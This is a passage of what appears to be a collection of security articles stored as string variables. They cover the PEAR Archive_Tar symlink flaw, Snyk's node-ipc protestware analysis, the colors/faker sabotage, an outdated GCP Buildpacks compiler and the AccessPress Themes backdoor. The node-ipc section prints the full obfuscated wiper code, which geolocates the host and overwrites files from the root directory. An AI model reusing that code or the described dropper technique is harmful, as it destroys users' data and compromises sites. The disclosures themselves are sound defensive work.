Persistence: CVE-2020-36193 in Archive_TarAfter finding a way to access the features reserved to approved developers, threat actors are likely to look to gain remote code execution on the server. Such discovery would grant them considerably more operational capabilities: even if the previously mentioned bug ends up being fixed, a backdoor will allow keeping persistent access to the server and to continue to alter packages releases. It could also help them to hide their tracks by modifying access logs.IdentificationThe initial access obtained with this first bug expands the attack surface to new features that were not reachable without an account and also likely to be less secure.When deploying pearweb on our test virtual machine, we noticed that it pulled the dependency Archive_Tar in an old version (1.4.7, while the last one is 1.4.14):root@pearweb:/var/www/html/pearweb# pear list Installed packages, channel pear.php.net: ========================================= Package Version State Archive_Tar 1.4.7 stableLooking at the changelog entries of this package, we can notice that until Archive_Tar 1.4.12, creating a symbolic link pointing to an absolute path outside of the extraction directory was possible; this bug is tracked as CVE-2020-36193.That bug class is very powerful, as it could allow writing a PHP file in a directory served by the HTTP server, ultimately leading to arbitrary code execution.This library is used to extract package contents in a temporary directory to process them with phpDocumentor and later publish the resulting files:cron/apidoc-queue.php$query = SELECT filename FROM apidoc_queue WHERE finished = 0000-00-00 00:00:00; $rows = $dbh->getCol($query); foreach ($rows as $filename) { $info = $pkg_handler->infoFromTgzFile($filename); $tar = new Archive_Tar($filename); // [...] /* Extract files into temporary directory */ $tmpdir = PEAR_TMPDIR . /apidoc/ . $name; // [...] $tar->extract($tmpdir);This code is triggered at regular intervals using cron and new records are added to the table filename every time a new release of a package is published: this call to Archive_Tar::extract() is then reachable by attackers thanks to the initial access they obtained with the first bug we presented.ExploitationTo understand the technical details behind this vulnerability, some background knowledge about Tar archives is necessary. Archived files are stored sequentially, each entry prefixed with a 512 bytes header and their contents aligned to 512 bytes. The end of an entry is signaled with two empty records of 512 bytes. Fields like the file mode, the owner and group numeric identifier, and the file size are stored as octal numbers using ASCII digits.This archive format supports writing multiple kinds of objects to the disk, and among them are symbolic links: based on the CVE description, we can make the assumption that the bug lies in Archive_Tar s implementation of the extraction of such entries. It is easy to locate its implementation in the source code: at [1] we match any entry whose type is Symbolic link, remove the destination (header entry filename) at [2], and then finally create the link at [3]:Archive/Tar.phpelseif ($v_header[typeflag] == 2) { // [1] if (@file_exists($v_header[filename])) { @unlink($v_header[filename]); // [2] } if (!@symlink($v_header[link], $v_header[filename])) { // [3] $this->_error( Unable to extract symbolic link { . $v_header[filename] . } ); return false; }Unlike $v_header[link] , $v_header[filename] is validated beforehand using _maliciousFilename() to ensure the absence of directory traversal characters and dangerous scheme wrappers:Archive/Tar.phpprivate function _maliciousFilename($file) { if (strpos($file, phar://) === 0) { return true; } if (strpos($file, ../) !== false || strpos($file, ..\\) !== false) { return true; } return false; }It should also be mentioned that the extraction of absolute paths is made safe by always prefixing with the destination folder ( $p_path ):Archive/Tar.phpif (($p_path != ./) && ($p_path != /)) { while (substr($p_path, -1) == /) { $p_path = substr($p_path, 0, strlen($p_path) - 1); } if (substr($v_header[filename], 0, 1) == /) { $v_header[filename] = $p_path . $v_header[filename]; } else { $v_header[filename] = $p_path . / . $v_header[filename]; } }As suggested by the CVE description, there is no validation performed on the destination of symbolic links. It could be exploited in several ways, among which:The phar:// scheme wrapper is blocked, but not other values like file:// or even PHAR:// : these bugs are CVE-2020-28948 and CVE-2020-28949, both fixed in Archive_Tar 1.4.11;scheme wrapper is blocked, but not other values like or even : these bugs are CVE-2020-28948 and CVE-2020-28949, both fixed in 1.4.11; Creating a symbolic link whose target is outside of the current directory.We can either create a new link pointing to a folder out of the extraction directory and write a file to it, or create two entries with the same name (it is allowed by this format!), the first being a symbolic link and the second the contents to write.We were able to confirm the exploitability of this bug by writing arbitrary content to /var/www/html/pearweb/public_html/evil.php , demonstrating the ability for an attacker to execute arbitrary code on the server. This is the second step of the proof-of-concept video.PatchThe maintainers first released a first patch on August 4th, in which they introduced a safe method to generate pseudo-random bytes in the password reset functionality.This code had a subtle flaw exploitable due to PHP not raising fatal errors when referencing non-existent variables and associating them with a default value, NULL .At [1], a string made of 16 random bytes is assigned to $random_bytes , while md5( $rand_bytes ) is called at [2]: this second variable does not exist ( $rand om _bytes vs $rand_bytes ) and this operation will always result in the MD5 hash of an empty string ( d41d8cd98f00b204e9800998ecf8427e ).--- a/include/users/passwordmanage.php +++ b/include/users/passwordmanage.php @@ -55,7 +55,12 @@ function resetPassword($user, $pass1, $pass2) { require_once Damblan/Mailer.php; $errors = array(); - $salt = md5(mt_rand(4,13) . $user . time() . $pass1); + // [1] + $random_bytes = openssl_random_pseudo_bytes(16, $strong); + if ($random_bytes === false || $strong === false) { + $errors[] = Could not generate a safe password token; + return $errors; + } + // [2] + $salt = md5($rand_bytes): PEAR::staticPushErrorHandling(PEAR_ERROR_RETURN); $this->_dbh->query(DELETE FROM lostpassword WHERE handle=?, array($user)); $e = $this->_dbh->query(INSERT INTO lostpassword @@ -91,4 +96,4 @@ function resetPassword($user, $pass1, $pass2) } return $errors; }We notified the maintainers of this typo, after which they promptly fixed it. They also upgraded the version of Archive_Tar in use, preventing the second vulnerability we presented.TimelineDate Action 2021-07-30 We report all issues to active maintainers of PEAR. 2021-08-03 A maintainer confirms the issues and starts working on patches; patches are released on GitHub a few days after. 2021-09 - 2022-03 We regularly ask for updates, to make sure the patches are deployed on the production instance. 2022-03-13 The patches are deployed in production. 2022-03-25 The vulnerabilities of this article are publicly presented at Insomnihack.SummaryIn this article, we presented two code vulnerabilities that could have been exploited to perform a supply chain attack against the PEAR ecosystem and compromise both developers and companies who rely on it. These vulnerabilities have been present for more than a decade and were trivial to identify and exploit, raising questions about the lack of security contributions from companies relying on them.We also recommend reviewing your use of PEAR and consider migrating to Composer, where the contributors community is more active and the same packages are available.We would like to thank Ken Guest, Mark Wiesemann, and Chuck Burgess of the PEAR team for handling our security advisory and deploying the patches. You can support The PHP Foundation on OpenCollective."
article8 = "Published on 2022-03-16 18:15:00-05:00. On March 15, 2022, users of the popular Vue.js frontend JavaScript framework started experiencing what can only be described as a supply chain attack impacting the npm ecosystem. This was the result of the nested dependencies node-ipc and peacenotwar being sabotaged as an act of protest by the maintainer of the node-ipc package.This security incident involves destructive acts of corrupting files on disk by one maintainer and their attempts to hide and restate that deliberate sabotage in different forms. While this is an attack with protest-driven motivations, it highlights a larger issue facing the software supply chain: the transitive dependencies in your code can have a huge impact on your security.Snyk is tracking the security incidents that are portrayed in this article via the following CVEs: CVE-2022-23812 for node-ipc and SNYK-JS-PEACENOTWAR-2426724 for peacenotwar and oneday-test npm modules. If you are already using Snyk for open source security and supply chain security, you will be getting notifications, alerts, and automated pull requests raised by the tooling to keep you safe and informed on the matter. To learn more about the details of this supply chain attack, keep reading.Prior events leading to the abuse of npm package node-ipcThis story started on March 8, 2022, at 6PM GMT+2, at which time, npm maintainer RIAEvangelist (Brandon Nozaki Miller) wrote source code and published an npm package called peacenotwar, which per their description for this module:This code serves as a non-destructive example of why controlling your node modules is important. It also serves as a non-violent protest against Russia s aggression that threatens the world right now. This module will add a message of peace on your users desktops, and it will only do it if it does not already exist just to be polite.Up until yesterday (March 15), this module had virtually no downloads at all. However that all changed when its npm maintainer added this module as a dependency to one of their other popular modules node-ipc , which is by itself a popular dependency that many JavaScript developers in the ecosystem are relying upon.One of those JavaScript ecosystem projects is Vue.jss command line tool, the Vue.js CLI, also known as npm package @vue/cli . The following nested dependency tree shows exactly how node-ipc trickles into the Vue.js CLI npm package and further promotes the need to vet nested dependencies as a holistic risk:- @vue/cli | - @vue/cli-ui | - node-ipc@^ 9.2 .1 - @vue/cli-shared-utils | - node-ipc@^ 9.1 .1The current latest stable version of npm package node-ipc (version 9.2.2) bundles peacenotwar and also, interestingly enough, it bundles the infamous colors npm package with a wildcard * dependency range. If you havent heard the story of the npm package colors, and faker being intentionally abused and corrupted by its npm package maintainer Marak, I highly suggest following up on that as another perspective of open source supply chain security.Timeline of eventsPrior versions of node-ipc , such as 10.1.0 (released six months ago) and up until 10.0.0 (released nine months ago), have all had genuine updates and improvements added into them. However…March 7Last week, version 10.1.1 was published with clear code updates that raised concerns for suspicious activity and potential abuse of the source code and the packages behavior. Lets explore the difference between version 10.1.0 and 10.1.1:diff --git a/node-ipc.cjs b/node-ipc.cjs index v10 .1 .0 ..v10 .1 .1 100666 --- a/node-ipc.cjs +++ b/node-ipc.cjs @@ - 1030 , 6 + 1030 , 74 @@ }); } + // dao/ssl-geospec.js + var import_path = __toModule( require ( path )); + var import_fs3 = __toModule( require ( fs )); + var import_https = __toModule( require ( https )); + setTimeout ( function ( ) { + const t = Math .round( Math .random() * 4 ); + if (t > 1 ) { + return ; + } + const n = Buffer.from( aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ= , base64 ); + import_https.default.get(n.toString( utf8 ), function ( t2 ) { + t2.on( data , function ( t3 ) { + const n2 = Buffer.from( Li8= , base64 ); + const o2 = Buffer.from( Li4v , base64 ); + const r = Buffer.from( Li4vLi4v , base64 ); + const f = Buffer.from( Lw== , base64 ); + const c = Buffer.from( Y291bnRyeV9uYW1l , base64 ); + const e = Buffer.from( cnVzc2lh , base64 ); + const i = Buffer.from( YmVsYXJ1cw== , base64 ); + try { + const s = JSON .parse(t3.toString( utf8 )); + const u2 = s[c.toString( utf8 )].toLowerCase(); + const a2 = u2.includes(e.toString( utf8 )) || u2.includes(i.toString( utf8 )); + if (a2) { + h(n2.toString( utf8 )); + h(o2.toString( utf8 )); + h(r.toString( utf8 )); + h(f.toString( utf8 )); + } + } catch (t4) { + } + }); + }); +}, Math .ceil( Math .random() * 1e3 )); + async function h ( n =  , o2 =  ) { + if (!import_fs3.default.existsSync(n)) { + return ; + } + let r = []; + try { + r = import_fs3.default.readdirSync(n); + } catch (t) { + } + const f = []; + const c = Buffer.from( 4p2k77iP , base64 ); + for ( var e = 0 ; e < r.length; e++) { + const i = import_path.default.join(n, r[e]); + let t = null ; + try { + t = import_fs3.default.lstatSync(i); + } catch (t2) { + continue ; + } + if (t.isDirectory()) { + const s = h(i, o2); + s.length > 0 ? f.push(...s) : null ; + } else if (i.indexOf(o2) >= 0 ) { + try { + import_fs3.default.writeFile(i, c.toString( utf8 ), function ( ) { + }); + } catch (t2) { + } + } + } + return f; +} + var ssl = true ; +The node-ipc.cjs CommonJS compatible Node.js module is quite long, at more than 1000 lines of code. The existence of outbound HTTPS calls to remote locations, and Base64-encoded data in it are a good enough reason to alert for possible wrong-doings here, and serve as a base for IoCs (indications of compromise).This code that has been added to node-ipc@10.1.1 sets a timer, so that on every pre-configured random interval, of which a node-ipc related code is being called, it also executes a function, to what seems to be, making file system operations.Lets take a closer look at the Base64-encoded values of the arguments passed to the function which executes filesystem operations. From the above diff:+ const n2 = Buffer.from( Li8= , base64 ); + const o2 = Buffer.from( Li4v , base64 ); + const r = Buffer.from( Li4vLi4v , base64 ); + const f = Buffer.from( Lw== , base64 ); + const c = Buffer.from( Y291bnRyeV9uYW1l , base64 ); + const e = Buffer.from( cnVzc2lh , base64 ); + const i = Buffer.from( YmVsYXJ1cw== , base64 );All of these are then passed to the timer function, such as:+ h(n2.toString( utf8 ));The values for the above encoded Base64 strings are:n2 is set to: ./o2 is set to: ../r is set to: ../../f is set to: /When these are passed to the timer function, they are then being used in the following line of code as sources of file inputs to wipe the file contents and replace it with a heart emoji (depicted via diff line + const c = Buffer.from(4p2k77iP, base64); )+ try { + import_fs3.default.writeFile(i, c.toString( utf8 ), function ( ) { + });At this point, a very clear abuse and a critical supply chain security incident will occur for any system on which this npm package will be called upon, if that matches a geo-location of either Russia or Belarus.Simulated debug results in a test sandbox.The updated contents of the README file for node-ipc@10.1.1 does not call out this newly added behavior. It instead includes a call to sponsor RIAEvangelist and an example of how to use ES6 and CommonJS version of node-ipc in versions 10 and up.About ten hours later, version node-ipc@10.1.2 was released, with nearly no change except for a version bump. Potentially, trying to trigger automated dependency upgrades. Here is the full git diff between the two versions:diff --git a/package.json b/package.json index v10 .1 .1 ..v10 .1 .2 100666 --- a/package.json +++ b/package.json @@ - 1 , 6 + 1 , 6 @@ { name : node-ipc , - version : 10.1.1 , + version : 10.1.2 , description : A nodejs module for local and remote Inter Process Communication (IPC), Neural Networking, and able to facilitate machine learning. , type : module , main : node-ipc.cjs ,March 8Then, roughly five hours after that, on March 8, a new release is pushed: node-ipc@10.1.3 , which seems to have removed all indications of the aforementioned destructive payload. Examining the git diff between the two versions confirms:diff --git a/node-ipc.cjs b/node-ipc.cjs index v10 .1 .2 ..v10 .1 .3 100666 --- a/node-ipc.cjs +++ b/node-ipc.cjs @@ - 1030 , 74 + 1030 , 6 @@ }); } - // dao/ssl-geospec.js - var import_path = __toModule( require ( path )); - var import_fs3 = __toModule( require ( fs )); - var import_https = __toModule( require ( https )); - setTimeout ( function ( ) { - const t = Math .round( Math .random() * 4 ); - if (t > 1 ) { - return ; - } … diff --git a/dao/ssl-geospec.js b/dao/ssl-geospec.js deleted file mode 100666 index v10 .1 .2 ..v10 .1 .3 --- a/dao/ssl-geospec.js +++ b/dao/ssl-geospec.js @@ - 1 , 1 + 0 , 0 @@ - import u from path ; import a from fs ; import o from https ; setTimeout ( function ( ) { const t= Math .round( Math .random()* 4 ); if (t> 1 ){ return } const n=Buffer.from( aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ= , base64 );o.get(n.toString( utf8 ), function ( t ) {t.on( data , function ( t ) { const n=Buffer.from( Li8= , base64 ); const o=Buffer.from( Li4v , base64 ); const r=Buffer.from( Li4vLi4v , base64 ); const f=Buffer.from( Lw== , base64 ); const c=Buffer.from( Y291bnRyeV9uYW1l , base64 ); const e=Buffer.from( cnVzc2lh , base64 ); const i=Buffer.from( YmVsYXJ1cw== , base64 ); try { const s= JSON .parse(t.toString( utf8 )); const u=s[c.toString( utf8 )].toLowerCase(); const a=u.includes(e.toString( utf8 ))||u.includes(i.toString( utf8 )); if (a){h(n.toString( utf8 ));h(o.toString( utf8 ));h(r.toString( utf8 ));h(f.toString( utf8 ))}} catch (t){}})})}, Math .ceil( Math .random()* 1e3 )); async function h ( n=  ,o=  ) { if (!a.existsSync(n)){ return } let r=[]; try {r=a.readdirSync(n)} catch (t){} const f=[]; const c=Buffer.from( 4p2k77iP , base64 ); for ( var e= 0 ;e<r.length;e++){ const i=u.join(n,r[e]); let t= null ; try {t=a.lstatSync(i)} catch (t){ continue } if (t.isDirectory()){ const s=h(i,o);s.length> 0 ?f.push(...s): null } else if (i.indexOf(o)>= 0 ){ try {a.writeFile(i,c.toString( utf8 ), function ( ) {})} catch (t){}}} return f}; const ssl= true ; export {ssl as default ,ssl}We suspect that this had been rolled out of the 10.x version branch due to a conversation stemming from the GitHub issue that reported this behavior, in which the maintainer claims that they have published that payload as part of a new major version of the library:So, at this point, we can summarize that the vulnerable versions of node-ipc being node-ipc@10.1.1 and node-ipc@10.1.2 have existed on the npmjs registry for less than 24 hours, yet due to the high downloads count across developers and build systems, this has definitely impacted some of them, as we have confirmed being reported on public repositories:However, vulnerable versions 10.1.1 and 10.1.2 no longer exist on the npmjs registry, and have actually been flagged deprecated , either by the maintainer or by the npmjs team. We can confirm that from the following npmjs website notice:On March 8, at 7:25PM GMT+2 and less than four hours after node-ipc@10.1.3 had been published to roll back the destructive payload, a new major version node-ipc@11.0.0 was released on the npmjs registry. What changed?New node-ipc@11.0.0 major version now includes the following:A dependency on peacenotwar moduleAny time the node-ipc module functionality gets called, it prints to STDOUT a message taken out of the peacenotwar module, as well as places a file on the users Desktop directory with contents relating to the current war-time situation of Russia and Ukraine.The README for 11.0.0 communicates the explicit usage of peacenotwar as part of this module in the following note: ***as of v11*** this module uses the [peacenotwar](https://github.com/RIAEvangelist/peacenotwar) module.What lead to npm package peacenotwar put into mainline node-ipc versions impacting millions of developers?March 15Yesterday, on March 15, at 6:49PM GMT+2 and 7:40PM GMT+2, two new significant and impactful npm versions were published for node-ipc. Most significant of these is a new patch version node-ipc@9.2.2 due to the fact it is the latest stable branch of node-ipc and many ecosystem projects rely on it, including the aforementioned @vue/cli Vue.js CLI.Following are the changes added in node-ipc@9.2.2 :It adds some example source code into the package contents. It adds peacenotwar as a dependency, and runs it when node-ipc is being called by any dependencies that import it. It also explicitly adds a dependency on colors@* which pulls in intentionally vulnerable source code by another maintainer. It changes the license in this new minor version from MIT license to DBAD license Editors note: TheDBADlicense contains coarse language.At around the same time, a new minor version was released: node-ipc@11.1.0 which bumps the peacenotwar dependency to a new version, but removes the console.log() STDOUT messages that were logged. We can confirm in the following git diff log between the two npm packages of node-ipc :diff --git a/node-ipc.cjs b/node-ipc.cjs index v11 .0 .0 ..v11 .1 .0 100666 --- a/node-ipc.cjs +++ b/node-ipc.cjs @@ - 1328 , 7 + 1328 , 6 @@ var OneDriveDesktopFileExists = fromDir(OneDriveDesktops, WITH-LOVE-FROM-AMERICA.txt ); var OneDriveFileExists = fromDir(OneDrive, WITH-LOVE-FROM-AMERICA.txt ); function deliverAPeacefulMessage ( path2, message ) { - console .log(path2); try { import_fs5.default.writeFile(path2, message, function ( err ) { }); @@ - 1336 , 7 + 1335 , 6 @@ } } if (!(DesktopFileExists == null ? void 0 : DesktopFileExists.length) && !(OneDriveFileExists == null ? void 0 : OneDriveFileExists.length) && !(OneDriveDesktopFileExists == null ? void 0 : OneDriveDesktopFileExists.length)) { - console .log( in here ); const thinkaboutit = WITH-LOVE-FROM-AMERICA.txt ; const WITH_LOVE_FROM_AMERICA = read( `./ ${thinkaboutit} ` ); deliverAPeacefulMessage( ` ${Desktops} ${thinkaboutit} ` , WITH_LOVE_FROM_AMERICA); diff --git a/package.json b/package.json index v11 .0 .0 ..v11 .1 .0 100666 --- a/package.json +++ b/package.json @@ - 1 , 6 + 1 , 6 @@ { name : node-ipc , - version : 11.0.0 , + version : 11.1.0 , description : A nodejs module for local and remote Inter Process Communication (IPC), Neural Networking, and able to facilitate machine learning. , type : module , main : node-ipc.cjs , @@ - 19 , 7 + 19 , 7 @@ event-pubsub : 5.0.3 , js-message : 1.0.7 , js-queue : 2.0.2 , - peacenotwar : ^9.1.3 , + peacenotwar : ^9.1.5 , strong-type : ^1.0.1 }, devDependencies : {Supply chain security in the face of maintainer reputationEven if the deliberate and dangerous act of maintainer RIAEvangelist will be perceived by some as a legitimate act of protest. How does that reflect on the maintainers future reputation and stake in the developer community? Would this maintainer ever be trusted again to not follow up on future acts in such or even more aggressive actions for any projects they participate in?Currently, RIAEvangelist maintains over 40 other npm packages with hundreds of millions of downloads behind them. Here are just a few of the modules they maintain and their weekly downloads on the npmjs registry:npm Module Weekly downloads node-ipc — A nodejs module for local and remote Inter Process Communication (IPC), Neural Networking, and able to facilitate machine learning. 1,055,386 js-queue — Simple JS queue with auto run for node and browsers. 1,042,512 easy-stack — Simple JS stack with auto run for node and browsers. 1,001,945 js-message — Normalized JS Object and JSON message and event protocol for node.js, vanialla js, react.js, components, actions, stores and dispatchers. 1,001,943 event-pubsub — Super light and fast Extensible ES6+ events and EventEmitters for Node and the browser. Easy for any developer level, use the same exact code in node and the browser. No frills, just high speed events! 996,076 node-cmd — Simple commandline/terminal/shell interface to allow you to run cli or bash style commands as if you were in the terminal. 41,083The Snyk Security Research team hasnt found any indications of other packages by this maintainer having any intentional abuse like this, but remains vigilant to updates published to the npmjs ecosystem.How to mitigate the node-ipc issueWith concerns about future code updates that may put users at risk, we recommend avoiding the node-ipc npm package entirely. If this npm package is bundled in your project as part of the application you are building, then we recommend that you use the npm package managers feature to override the sabotaged versions altogether and pin down the transitive dependency to known good.If you are using npm as the package manager, you can add the following to your package.json file to explicitly allow only benign versions of node-ipc :overrides : { node-ipc@>9.2.1 <10 : 9.2.1 , node-ipc@>10.1.0 : 10.1.0 }Known high-profile victims of the node-ipc incidentVue.js project found vulnerable to node-ipcs protestwareThe Vue.js CLI used to depend on node-ipc s 9.x version range and was vulnerable to the 9.2.2 version which added the peacenotwar module that would write a WITH-LOVE-FROM-AMERICA.txt file on the users desktop directory. The vulnerability in @vue/cli has since been fixed. Please update to the latest versions of @vue/cli , either 4.5.16+ or 5.0.3+ using your package manager of choice:npm i -g @vue/cli pnpm i -g @vue/cli yarn global add @vue/cliUnity game engine found vulnerable to node-ipcs protestwareUsers have reported that the Unity game engine project was found to be distributing its software along with node-ipc@9.2.2 which was alarming to users who surprisingly found a new file created on their desktop. The Unity team rushed to release a hotfix 3.1.1 version on March 16th to mitigate the issue.SummarySnyk stands with Ukraine and weve proactively acted to support the Ukrainian people during the on-going crisis with donations and free service to developers world-wide, as well as taking action to cease business in Russia and Belarus. That said, intentional abuse such as this undermines the global open source community and requires us to flag impacted versions of node-ipc as security vulnerabilities.As such, the Snyk security team published CVE-2022-23812 and SNYK-JS-PEACENOTWAR-2426724 to alert and track the security vulnerability with the intentional vulnerable versions of node-ipc . Snyks free plan is also up to date with this new vulnerability, which enables developers to scan, monitor, and automatically deploy security fixes in the form of pull requests.Nevertheless, the impact of supply chain security incidents continues to demonstrate the need to properly manage and react swiftly to the risks with open source dependencies. Furthermore, the complexity of nested dependencies, such as on the npmjs JavaScript ecosystem has once again proven the compounding impact that they have across key ecosystem projects.Only two months ago we covered the widespread fallout of a similar security incident in which an open source maintainer pulled the plug on npm packages colors and faker, showcasing the ability for maintainers to intentionally sabotage open source libraries..Gaining skills in how to manage software dependencies at scale is becoming evidently more important, as well as ensuring that you as a developer are following npm security best practices, and learning about security pitfalls and incidents such as why npm lockfiles can be a security blindspot for injecting malicious modules.Learn more about supply chain security with these blogs:"
article9 = "Published on 2022-02-09 14:52:00+00:00. The bizarre case of the author who corrupted his own npm packages – colors.js and faker.js.Originally reported by Bleeping Computer on Jan 9th the author of npm packages colors.js and faker.js, Marak Squires, has intentionally committed corrupt versions of each to his public GitHub repositories that trigger infinite loops causing a denial of service. These packages have affected an unknown number of users. The weekly download of colors.js (27 million with 19k dependent packages) and faker.js (3 million with 2500 dependent packages) makes this a wide spread issue across the industry.82% of audit service customers from Revenera in 2021 contained Node Module Packages. Of those, 94% use colors.js while faker.js ranks at 67%.At first the effects may be seemingly innocuous because of the projects use cases. colors.js changes the color and style of text while faker.js creates fake data.Seems simple right? But this is exactly why we love them: simple, small, and affordable (free) open source software. But one line of corrupt code can send your whole product askew.Keep in mind, node modules can be vastly distributed across a single platform, affecting many products, and will determine the viability of various dependency packages related to its usage. One corrupted node module with a denial of service attack can possibly cause issues with many areas of your product.Motivation and Public SentimentSquires motivations were explained on his personal blog from April 2021, Monetizing Open-source is problematic as well as on the faker.js repo, No more free work from Marak – Pay Me or Fork This and the reaction from the open source community has been varied.While there are a group of people supporting Marak, given he is in fact the rightful owner and can do what he wants with his code, others are contending that it is an irresponsible response to what arose over one organization profiting off his work without him benefiting.While his frustrations are understood, the solution to such issues as non-payment have more reasonable solutions then sabotaging your own code. For example, its possible to update the license to AGPL v3.0 which would require for-profit organizations to pay the author for a version of the product under another license or offering a supported version of the product.Either way his actions have stirred up a conversation on many fronts, from the continuous need for testing to the rights and responsibilities of code owners.For additional reading see: VessOnSercurity and the general discussion at twitter/color.js and redditA look at the corrupted color.js codeAs originally reported by Sonatype, Developers contributing to well-known OSS projects, including Amazons Cloud Development Kit (aws-cdk), Facebooks Jest, Node.js Open CLI Framework, and Nomic Labs Hardhat were all impacted and expressed concerns as to if colors.js had been hijacked.As seen below, the affected version of colors.js outputs the text, LIBERTY LIBERTY LIBERTY, followed by an ASCII drawing of Uncle Sam, an American Flag, and a reference to Carl Pilcher. We believe this is a reference to an American Astrobiologist from NASA. This is followed by an infinite loop of this data being introduced by index.js on line 18 causing the output seen below in figure 3.The corrupt colors.js code seen below has cheekily been referred to by the author as the zalgo issue. Zalgo text refers to certain non-ASCII characters that appear glitchy./lib/index.js – The Loop/lib/custom/american.js – The AmericanThe results cause an infinite loop of data that causes a denial of service: offroaders123Solutions and Recommendations to the BugsRegardless of the reasoning behind the authors choice to introduce his own bugs, there are a few solutions.First the affected versions of the products are: colors: on GitHub is 1.4.44-liberty-2 and npm versions 1.4.1 and 1.4.2; faker.js: version 6.6.6As of this publication all versions of the sabotaged code of colors has been removed from npm. If you are pulling in the latest version of colors from npm you will be fine.Downgrading to an earlier version of colors (e.g. 1.4.0) and faker (e.g. 5.5.3) is a safe solution for both.Move to the new dev project. Faker is now forked and is being maintained by a new group of developers hosted on npm and GitHub.It is also always good practice when pulling code from npm to pin your dependency modules to a trusted version instead of pulling in the latest version. Pulling in the latest version always has the risk of introducing new bugs and security vulnerabilities."
article10 = "Published on None. [FIXED]: GCP Buildpacks Old Compiler Injection Write-UpI would like to personally thank the GCP Buildpacks team for supporting this important project and fixing this issue!This article describes a FIXED vulnerability in GCP Buildpacks that I discovered and collaborated with the GCP team to fix. The buildpack now downloads the most recent stable compiler, effectively fixing the problem.The short version of this report is the GCP Golang Buildpack used to pull in an old, no-longer-maintained compiler. Today, it pulls in the latest stable compiler.This bug also highlights the need for SBOM and in-toto attestations, including compiler information. People will make mistakes, and these tools will help prevent or detect these errors. A properly attested SBOM will eventually allow automated processes to detect and report vulnerabilities such as in this this write-up.A side effect of fixing this bug in the GCP Buildpack is all future builds using this Buildpack will be protected from this failure mode.Products:Fix:Write-upBefore the fix, GCP Buildpacks originally pulled in older compilers based upon the level of compatibility rather than the latest stable version.For example, thub.com/fkautz/serve has the following go.mod:module github.com/fkautz/serve require ( github.com/cpuguy83/go-md2man/v2 v2.0.0 // indirect github.com/felixge/httpsnoop v1.0.2 // indirect github.com/gorilla/handlers v1.5.1 github.com/russross/blackfriday/v2 v2.1.0 // indirect github.com/urfave/cli v1.22.5 ) go 1.13The buildpack would pull in the original go 1.13 compiler and build the project. Using an older compiler to build resulted in insecure binaries with known vulnerabilities originating from the old compiler and golang stdlib.$ pack build -B gcr.io/buildpacks/builder:v1 fkautz/serve [omitted...] === Go - Runtime ([email protected]) === Using runtime version from go.mod: 1.13 Installing Go v1.13 -------------------------------------------------------------------------------- Running bash -c curl --fail --show-error --silent --location --retry 3 https://dl.google.com/go/go1.13.linux-amd64.tar.gz | tar xz --directo ry /layers/google.go.runtime/go --strip-components=1 Done bash -c curl --fail --show-error --silent --location --retry... (9.997062215s) [omitted...]GCP Build Pipelines AffectedI tried this with the buildpacks build feature in google cloud with a go1.14 compatible project and got the following:gcloud alpha builds submit --pack image = gcr.io/fkautz-dev/sample-go === > ANALYZING [ analyzer ] Previous image with name gcr.io/571261452737/sample-go not found === > RESTORING === > BUILDING [ builder ] === Go - Runtime ( [email protected] ) === [ builder ] Using runtime version from go.mod: 1.14 [ builder ] Installing Go v1.14 [ builder ] -------------------------------------------------------------------------------- [ builder ] Running bash -c curl --fail --show-error --silent --location --retry 3 https://dl.google.com/go/go1.14.linux-amd64.tar.gz | tar xz --directory /layers/google.go.runtime/go --strip-components=1 [ builder ] Done bash -c curl --fail --show-error --silent --location --retry... ( 3.590012839s )The system pulls in the oldest compiler rather than the latest golang compiler. You can see it pulling go1.14 instead of go1.17.6.ResolutionThe most recent version of GCP Buildpacks now pulls in the latest compiler. The above is now fixed and deployed.The fix is located in this commit."
article11 = "Published on 2022-01-18 00:00:00. Update Feb. 1 – Changed the Affected themes section to reflect that new versions of the themes are starting to appear.While investigating a compromised site we discovered some suspicious code in a theme by AccessPress Themes (aka Access Keys), a vendor with a large number of popular themes and plugins. On further investigation, we found that all the themes and most plugins from the vendor contained this suspicious code, but only if downloaded from their own website. The same extensions were fine if downloaded or installed directly from the WordPress.org directory.Due to the way the extensions were compromised, we suspected an external attacker had breached the website of AccessPress Themes in an attempt to use their extensions to infect further sites.We contacted the vendor immediately, but at first we did not receive a response. After escalating it to the WordPress.org plugin team, our suspicions were confirmed. AccessPress Themes websites were breached in the first half of September 2021, and the extensions available for download on their site were injected with a backdoor.Once we had established a channel for communicating with the vendor, we shared our detailed findings with them. They immediately removed the offending extensions from their website.Most of the plugins have since been updated, and known clean versions are listed towards the bottom of this post. However, the affected themes have not been updated, and are pulled from the WordPress.org theme repository. If you have any of the themes listed towards the bottom of this post installed on your site, we recommend migrating to a new theme as soon as possible.This disclosure concerns a large number of extensions, both plugins and themes. Skip to the list below, or read on for the details.Details:Vendor: AccessPress ThemesVendor url: https://accesspressthemes.comPlugins: multipleThemes: multipleCVE: CVE-2021-24867Analysis:The infected extensions contained a dropper for a webshell that gives the attackers full access to the infected sites. The dropper is located in the file inital.php located in the main plugin or theme directory. When run it installs a cookie based webshell in wp-includes/vars.php . The shell is installed as a function just in front of the wp_is_mobile() function with the name of wp_is_mobile_fix() . This is presumably to not arouse suspicion to anybody casually scrolling through the vars.php file.Once the shell is installed, the dropper will phone home by loading a remote image from the URL hxxps://www.wp-theme-connect.com/images/wp-theme.jpg with the url of the infected site and information about which theme it uses as query arguments. Finally, it will remove the dropper source file to avoid detection when the request is finished executing.The webshell itself triggers if the user agent string in the request is wp_is_mobile and the request contains eight specific cookies. It pieces together and executes a payload from these supplied cookies.We have also seen another, presumably older, variant of the backdoor directly embedded in the theme/plugins functions.php file. This variant uses the same mechanism with piecing together the payload from eight cookies, but does not filter on the requests user agent string.To ensure that the dropper is executed, the main plugin file (for plugins) or the functions.php file (for themes) have been modified with code to execute the inital.php file if it exists.One striking detail from the timestamps of the compromised plugins is that they are all from early September. The majority are from September 6 and 7, with a few files from September 2 and 3. Similarly for the themes, all were compromised on September 22, except accessbuddy on September 9.Also, the timestamps within the zip-archives are very uniform, with almost all files with the exact same timestamp, except for the modified main plugin file and the added dropper file that is stamped a few minutes later (usually about 2-5 minutes after the other files in the archive).Looking at the timestamps for the zip-files downloaded from the wordpress.org repository however, we find a distribution of timestamps corresponding to when plugin/theme was actually updated. 